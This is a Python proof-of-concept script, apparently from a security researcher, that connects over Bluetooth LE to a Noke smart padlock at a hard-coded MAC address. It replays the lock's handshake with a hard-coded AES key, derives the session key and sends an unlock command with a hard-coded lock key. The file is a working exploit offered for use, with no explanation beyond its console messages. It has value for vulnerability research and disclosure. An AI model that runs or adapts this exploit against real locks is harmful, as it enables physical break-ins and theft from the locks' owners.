
from bluepy.btle import Peripheral
from bluepy.btle import DefaultDelegate
from Crypto.Cipher import AES
import time, random

RANDOM_NUMBER_CENTRAL = None
RANDOM_NUMBER_PERIPHERAL = None

class NokeDelegate(DefaultDelegate):

	def __init__(self):
		DefaultDelegate.__init__(self)
                self.aes_key = "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"

        def decrypt(self, payload):
                aes = AES.new(self.aes_key, AES.MODE_ECB)
                return aes.decrypt(payload)

	def handleNotification(self, handle, data):
		global RANDOM_NUMBER_PERIPHERAL
		try:
			response = self.decrypt(data[:-1])
			header = response[0:3]
			rn = response[3:7]
			checksum = response[7]
			RANDOM_NUMBER_PERIPHERAL = rn
			print '[+] Notification received'
			print '[+] \tHandle: 0x%x' % handle
			print '[+] \tData: 0x%s' % data.encode('hex')
			print '[+] \tDecrypted: 0x%s' % response.encode('hex')
			print '[+] \tPacket Header: 0x%s' % header.encode('hex')
			print '[+] \tRandom Numbers: 0x%s' % rn.encode('hex')
			print '[+] \tChecksum: 0x%s' % checksum.encode('hex')
		except Exception as error:
			print '[!] Erro ao receber notificacao'
			print error
class Noke:

	def __init__(self):
		self.aes_key = "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"

	def encrypt(self, payload):
		while len(payload) < 16:
			payload += "\x00"
		aes = AES.new(self.aes_key, AES.MODE_ECB)
		return aes.encrypt(payload)

	def getRandomNumber(self):
		random_number = ''
		for i in range(4):
			random_number += chr(random.randint(0, 255))
		return random_number

	def calcChecksum(self, payload):
		checksum = 0
		for c in payload:
			checksum += ord(c)
		checksum = '%08x' % checksum
		return checksum.decode('hex')[-1]

	def firstPacket(self, noke):
		print '[*] Sending first packet'
		noke.writeCharacteristic(0x000c, '\x01\x00')

	def secondPacket(self, noke):
		global RANDOM_NUMBER_CENTRAL
		print '[*] Sending second packet'
		# Header and payload variables
		header = "\x7e\x08\x01"
		random_number = self.getRandomNumber()
		payload = header + random_number
		unknown = '\xbf\x18'
		unknown = '\x00\x00'
		packet = self.encrypt(payload + self.calcChecksum(payload) + unknown)	
		noke.writeCharacteristic(0x000e, packet)
		RANDOM_NUMBER_CENTRAL = random_number

	def thirdPacket(self, noke):
		print '[*] Sending third packet'
		# New header and payload variables
		header = "\x7e\x0a\x06"
		lock_key = "\xcd\x49\x66\xd3\x7c\xbf"
		payload = header + lock_key
		packet = self.encrypt(payload + self.calcChecksum(payload))
		# Send third write command
		noke.writeCharacteristic(0x000e, packet)

	def createSessionKey(self):
		global RANDOM_NUMBER_PERIPHERAL, RANDOM_NUMBER_CENTRAL
		print '[+] Creating session key'
		session_key = list(self.aes_key)
		for i in range(4):
			xor = ord(RANDOM_NUMBER_CENTRAL[i]) ^ ord(RANDOM_NUMBER_PERIPHERAL[i])
			session_key[i + 5] = chr(ord(session_key[i + 5]) + xor)
		self.aes_key = "".join(session_key)

	def unlockNoke(self):	
		print '[*] Unlocking Noke Keylock'
		print '[*] Author: Victor Pasknel (MorphusLabs)\n'
		# Connect to noke lock
		mac = "cb:59:c7:03:5d:ef"
		noke = Peripheral(mac, addrType = 'random')
		noke.setDelegate(NokeDelegate())
		# Sending packets
		self.firstPacket(noke)
		self.secondPacket(noke)
		# Waiting for notification
		while True:
			if noke.waitForNotifications(1.0):
				break
		# Creating session key
		self.createSessionKey()
		# Sending final packet
		self.thirdPacket(noke)

#################################################################################################

n = Noke()
n.unlockNoke()
